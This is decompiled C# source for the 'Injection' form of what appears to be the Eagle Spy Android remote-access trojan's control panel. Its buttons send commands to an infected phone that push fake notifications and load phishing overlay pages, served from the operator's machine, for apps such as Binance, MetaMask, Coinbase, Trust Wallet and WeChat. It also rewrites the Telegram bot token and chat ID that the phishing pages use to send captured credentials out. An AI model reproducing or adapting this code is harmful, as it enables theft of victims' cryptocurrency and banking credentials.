using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eaglespy
{
	// Token: 0x020000ED RID: 237
	public partial class Injection : Form
	{
		// Token: 0x06000BB5 RID: 2997 RVA: 0x000075D3 File Offset: 0x000057D3
		public Injection()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000BB6 RID: 2998 RVA: 0x000075E1 File Offset: 0x000057E1
		private void drakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (!this.BWloader.IsBusy)
			{
				this.BWloader.RunWorkerAsync();
			}
		}

		// Token: 0x06000BB7 RID: 2999 RVA: 0x000FFE64 File Offset: 0x000FE064
		public void addlinks(string lnk)
		{
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				Label label = new Label();
				label.Cursor = Cursors.Hand;
				label.Dock = DockStyle.Top;
				label.Font = new Font("Calibri", 14f);
				label.ForeColor = Color.Aqua;
				label.Size = new Size(631, 40);
				label.TabIndex = 0;
				label.Text = lnk;
				label.TextAlign = ContentAlignment.MiddleCenter;
				label.MouseClick += delegate
				{
					try
					{
						if (this.classClient != null)
						{
							try
							{
								string[] array = this.classClient.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									this.classClient.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"lodp<*>g<*>",
										label.Text,
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										this.classClient.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(array2);
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				};
			}));
		}

		// Token: 0x06000BB8 RID: 3000 RVA: 0x000FFE98 File Offset: 0x000FE098
		private void BWloader_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				if (this.classClient != null)
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>l<*>",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BB9 RID: 3001 RVA: 0x000075FB File Offset: 0x000057FB
		private void Injection_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
			this.DisplayIPv4Address();
		}

		// Token: 0x06000BBA RID: 3002 RVA: 0x000FFFCC File Offset: 0x000FE1CC
		public void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.ip.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BBB RID: 3003 RVA: 0x00100048 File Offset: 0x000FE248
		private void detectbottoken()
		{
			string text = "C:\\\\Programs\\\\Files\\\\crypto";
			if (!Directory.Exists(text))
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] files = Directory.GetFiles(text, "*.html");
			if (files.Length == 0)
			{
				this.label1.Text = "Error !!";
				return;
			}
			string text2 = null;
			bool flag = true;
			string[] array = files;
			foreach (string text3 in array)
			{
				string text4 = File.ReadAllText(text3);
				string text5 = "botToken\\s*=\\s*'([^']+)'";
				Match match = Regex.Match(text4, text5);
				if (!match.Success)
				{
					flag = false;
					break;
				}
				string value = match.Groups[1].Value;
				if (text2 == null)
				{
					text2 = value;
				}
				else if (text2 != value)
				{
					flag = false;
					break;
				}
			}
			if (flag && text2 != null)
			{
				this.guna2TextBox2.Text = text2;
				return;
			}
			this.label1.Text = "Error !!";
		}

		// Token: 0x06000BBC RID: 3004 RVA: 0x00100134 File Offset: 0x000FE334
		private void detectchatidn()
		{
			string text = "C:\\\\Programs\\\\Files";
			if (!Directory.Exists(text))
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] files = Directory.GetFiles(text, "*.html");
			if (files.Length == 0)
			{
				this.label1.Text = "Error !!";
				return;
			}
			string text2 = null;
			bool flag = true;
			string[] array = files;
			foreach (string text3 in array)
			{
				string text4 = File.ReadAllText(text3);
				string text5 = "chatId\\s*=\\s*'([^']+)'";
				Match match = Regex.Match(text4, text5);
				if (!match.Success)
				{
					flag = false;
					break;
				}
				string value = match.Groups[1].Value;
				if (text2 == null)
				{
					text2 = value;
				}
				else if (text2 != value)
				{
					flag = false;
					break;
				}
			}
			if (flag && text2 != null)
			{
				this.guna2TextBox3.Text = text2;
				return;
			}
			this.label1.Text = "Error !!";
		}

		// Token: 0x06000BBD RID: 3005 RVA: 0x00002423 File Offset: 0x00000623
		private void drakeUIButtonIcon56_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000BBE RID: 3006 RVA: 0x00100220 File Offset: 0x000FE420
		private void replacebottoken()
		{
			string text = "C:\\\\Programs\\\\Files";
			string text2 = this.guna2TextBox2.Text;
			if (!Directory.Exists(text))
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] files = Directory.GetFiles(text, "*.html");
			if (files.Length == 0)
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] array = files;
			foreach (string text3 in array)
			{
				string text4 = File.ReadAllText(text3);
				string text5 = "botToken\\s*=\\s*'([^']+)'";
				string text6 = Regex.Replace(text4, text5, "botToken = '" + text2 + "'");
				File.WriteAllText(text3, text6);
			}
			this.label1.Text = "Success";
		}

		// Token: 0x06000BBF RID: 3007 RVA: 0x00100220 File Offset: 0x000FE420
		private void replacebottokenlock()
		{
			string text = "C:\\\\Programs\\\\Files";
			string text2 = this.guna2TextBox2.Text;
			if (!Directory.Exists(text))
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] files = Directory.GetFiles(text, "*.html");
			if (files.Length == 0)
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] array = files;
			foreach (string text3 in array)
			{
				string text4 = File.ReadAllText(text3);
				string text5 = "botToken\\s*=\\s*'([^']+)'";
				string text6 = Regex.Replace(text4, text5, "botToken = '" + text2 + "'");
				File.WriteAllText(text3, text6);
			}
			this.label1.Text = "Success";
		}

		// Token: 0x06000BC0 RID: 3008 RVA: 0x001002E0 File Offset: 0x000FE4E0
		private void replacechatid()
		{
			string text = "C:\\\\Programs\\\\Files";
			string text2 = this.guna2TextBox3.Text;
			if (!Directory.Exists(text))
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] files = Directory.GetFiles(text, "*.html");
			if (files.Length == 0)
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] array = files;
			foreach (string text3 in array)
			{
				string text4 = File.ReadAllText(text3);
				string text5 = "chatId\\s*=\\s*'([^']+)'";
				string text6 = Regex.Replace(text4, text5, "chatId = '" + text2 + "'");
				File.WriteAllText(text3, text6);
			}
			this.label1.Text = "Success";
		}

		// Token: 0x06000BC1 RID: 3009 RVA: 0x001003A0 File Offset: 0x000FE5A0
		private void replacechatidlock()
		{
			string text = "C:\\\\Programs\\\\Files\\\\crypto";
			string text2 = this.guna2TextBox3.Text;
			if (!Directory.Exists(text))
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] files = Directory.GetFiles(text, "*.html");
			if (files.Length == 0)
			{
				this.label1.Text = "Error !!";
				return;
			}
			string[] array = files;
			foreach (string text3 in array)
			{
				string text4 = File.ReadAllText(text3);
				string text5 = "chatId\\s*=\\s*'([^']+)'";
				string text6 = Regex.Replace(text4, text5, "chatId = '" + text2 + "'");
				File.WriteAllText(text3, text6);
			}
			this.label1.Text = "Success";
		}

		// Token: 0x06000BC2 RID: 3010 RVA: 0x00007609 File Offset: 0x00005809
		private void drakeUIButtonIcon22_Click(object sender, EventArgs e)
		{
			this.replacebottoken();
			this.replacechatid();
			this.replacebottokenlock();
			this.replacechatidlock();
		}

		// Token: 0x06000BC3 RID: 3011 RVA: 0x00007623 File Offset: 0x00005823
		private void drakeUIAvatar1_Click(object sender, EventArgs e)
		{
			this.detectbottoken();
		}

		// Token: 0x06000BC4 RID: 3012 RVA: 0x0000762B File Offset: 0x0000582B
		private void drakeUIAvatar2_Click_1(object sender, EventArgs e)
		{
			this.detectchatidn();
		}

		// Token: 0x06000BC5 RID: 3013 RVA: 0x00002423 File Offset: 0x00000623
		private void tabPage3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000BC6 RID: 3014 RVA: 0x00002423 File Offset: 0x00000623
		private void guna2Button8_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000BC7 RID: 3015 RVA: 0x00100460 File Offset: 0x000FE660
		private void drakeUIButtonIcon59_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/bybit.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BC8 RID: 3016 RVA: 0x00002423 File Offset: 0x00000623
		private void sPanel1_ParentChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000BC9 RID: 3017 RVA: 0x00100638 File Offset: 0x000FE838
		private void drakeUIButtonIcon62_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/kraken.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BCA RID: 3018 RVA: 0x00100810 File Offset: 0x000FEA10
		private void drakeUIButtonIcon68_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/crypto/trustwallet.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BCB RID: 3019 RVA: 0x001009E8 File Offset: 0x000FEBE8
		private void drakeUIButtonIcon98_Click(object sender, EventArgs e)
		{
			string text = "wechat>http://" + this.ip.Text + ":8081/bank/wechat.html>com.tencent.mm>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BCC RID: 3020 RVA: 0x00100B3C File Offset: 0x000FED3C
		private void drakeUIAvatar16_Click(object sender, EventArgs e)
		{
			string text = "wechat";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BCD RID: 3021 RVA: 0x00100C50 File Offset: 0x000FEE50
		private void drakeUIButtonIcon61_Click(object sender, EventArgs e)
		{
			string text = "Bybit>http://" + this.ip.Text + ":8081/crypto/bybit.html>com.bybit.app>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BCE RID: 3022 RVA: 0x00100DA4 File Offset: 0x000FEFA4
		private void drakeUIButtonIcon64_Click(object sender, EventArgs e)
		{
			string text = "kraken>http://" + this.ip.Text + ":8081/crypto/kraken.html>com.kraken.trade>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BCF RID: 3023 RVA: 0x00100EF8 File Offset: 0x000FF0F8
		private void drakeUIButtonIcon70_Click(object sender, EventArgs e)
		{
			string text = "trustwallet>http://" + this.ip.Text + ":8081/crypto/trustwallet.html>com.wallet.crypto.trustapp>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD0 RID: 3024 RVA: 0x0010104C File Offset: 0x000FF24C
		private void drakeUIButtonIcon73_Click(object sender, EventArgs e)
		{
			string text = "binance>http://" + this.ip.Text + ":8081/crypto/binance.html>com.binance.dev>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD1 RID: 3025 RVA: 0x001011A0 File Offset: 0x000FF3A0
		private void drakeUIButtonIcon76_Click(object sender, EventArgs e)
		{
			string text = "huobi>http://" + this.ip.Text + ":8081/crypto/huobi.html>pro.huobi>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD2 RID: 3026 RVA: 0x001012F4 File Offset: 0x000FF4F4
		private void drakeUIButtonIcon79_Click(object sender, EventArgs e)
		{
			string text = "kucoin>http://" + this.ip.Text + ":8081/crypto/kucoin.html>com.kubi.kucoin>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD3 RID: 3027 RVA: 0x00101448 File Offset: 0x000FF648
		private void drakeUIButtonIcon82_Click(object sender, EventArgs e)
		{
			string text = "metamask>http://" + this.ip.Text + ":8081/crypto/metamask.html>io.metamask>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD4 RID: 3028 RVA: 0x0010159C File Offset: 0x000FF79C
		private void drakeUIButtonIcon85_Click(object sender, EventArgs e)
		{
			string text = "exodus>http://" + this.ip.Text + ":8081/crypto/exodus.html>exodusmovement.exodus>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD5 RID: 3029 RVA: 0x001016F0 File Offset: 0x000FF8F0
		private void drakeUIButtonIcon88_Click(object sender, EventArgs e)
		{
			string text = "coinbase>http://" + this.ip.Text + ":8081/crypto/coinbase.html>com.coinbase.android>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD6 RID: 3030 RVA: 0x00101844 File Offset: 0x000FFA44
		private void drakeUIButtonIcon91_Click(object sender, EventArgs e)
		{
			string text = "coinbasewallet>http://" + this.ip.Text + ":8081/crypto/coinbasewallet.html>org.toshi>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD7 RID: 3031 RVA: 0x00101998 File Offset: 0x000FFB98
		private void drakeUIButtonIcon95_Click(object sender, EventArgs e)
		{
			string text = "blockchain>http://" + this.ip.Text + ":8081/crypto/blockchain.html>piuk.blockchain.android>";
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000BD8 RID: 3032 RVA: 0x00101AEC File Offset: 0x000FFCEC
		private void drakeUIButtonIcon60_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\bybit.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000BD9 RID: 3033 RVA: 0x00101C38 File Offset: 0x000FFE38
		private void drakeUIButtonIcon63_Click(object sender, EventArgs e)
		{
			try
			{
				string text = "C:\\Programs\\Files\\crypto\\kraken.html";
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

